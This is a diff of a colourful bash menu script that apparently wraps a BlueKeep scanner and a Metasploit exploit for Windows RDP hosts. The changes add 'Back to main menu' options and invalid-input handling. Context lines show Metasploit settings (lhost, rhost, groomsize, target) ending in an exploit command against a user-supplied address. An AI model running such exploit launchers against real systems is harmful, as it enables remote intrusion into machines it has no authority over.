@@ -48,6 +48,8 @@ echo -e "$white[$green$n1$white] use $yellow($green$pack1$yellow:$red$e$yellow)"
 echo -e "$white[$green$n2$white] use $yellow($green$pack2$yellow:$red$e$yellow)"
 echo -e "$white[$green$n3$white] use $yellow($green$pack3$yellow:$red$e$yellow)"
 echo -e "$white[$green$n4$white] use $yellow($green$r$yellow:$blue$b$yellow)"
+echo -e "$white[$green$n5$white] Back to main menu"
+
 }
 
 function info_b(){
@@ -141,7 +143,8 @@ read -p "$(echo -e $red$shell $nc)" ch
 if [[ $ch == "1" ]]; then
 
 echo -e "\n$white[$green$n1$white] $e$nc"
-echo -e "$white[$green$n2$white] $b$nc\n"
+echo -e "$white[$green$n2$white] $b$nc"
+echo -e "$white[$green$n3$white] Back to main menu $nc\n"
 
 read -p "$(echo -e $red$shell $nc)" ch1
 
@@ -155,6 +158,12 @@ echo ""
 read -p "$(echo -e $white$en$green ip$white addr$green : $nc)" ipv4
 python scanners/bluekeep_scanner.py --host $ipv4
 back
+elif [[ $ch1 == "3" ]]; then
+clear
+banner
+main
+else
+echo -e "$white[$green!$white] invalid option.$nc"
 fi
 elif [[ $ch == "2" ]]; then
 echo -e "\n "
@@ -194,14 +203,19 @@ set lhost $loc_ip;
 set rhost $t4;
 set groomsize 50;
 set target 1;
-exploit;"
+exploit	;"
+elif [[ $ch2 == "5" ]]; then
+clear
+banner
+main
 else
 echo -e "$white[$green!$white] Invalid Option.$nc"
 fi # of ch2
 elif [[ $ch == "3" ]]; then
 echo -e "\n$white[$green$n1$white]$red $e$nc"
 echo -e "$white[$green$n2$white]$blue $b$nc"
-echo -e "$white[$green$n3$white]$green Me$nc\n"
+echo -e "$white[$green$n3$white]$green Me$nc"
+echo -e "$white[$green$n4$white] Back to main menu $nc\n"
 
 read -p "$(echo -e $red$shell $nc)" ch3
 
@@ -211,6 +225,10 @@ elif [[ $ch3 == "2" ]]; then
 info_b
 elif [[ $ch3 == "3" ]]; then
 info_me
+elif [[ $ch3 == "4" ]]; then
+clear
+banner
+main
 else
 echo -e "$white[$green!$white] Invalid Option.$nc"
 fi
